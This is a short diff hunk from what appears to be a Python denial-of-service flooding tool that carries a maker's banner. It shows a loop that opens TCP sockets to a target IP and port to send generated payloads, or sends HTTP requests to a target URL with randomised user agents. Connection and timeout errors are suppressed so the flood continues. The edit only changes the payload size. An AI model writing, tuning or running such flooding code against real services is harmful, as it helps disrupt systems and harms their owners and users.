@@ -80,7 +80,7 @@ Pembuat Tolls: {YELLOW}ENIONS{GREEN}PLANET{YELLOW}✓✓✓
                     elif METHOD=="BOTS":
                         s=socket(AF_INET,SOCK_STREAM)
                         s.connect((IP,PORT))
-                        s.send(K_imets(50055))
+                        s.send(K_imets(577))
                     elif METHOD=="URL":urlopen(Request(TARGET,headers=ua.Random()))
                 except TimeoutError:pass
                 except ConnectionRefusedError as e:
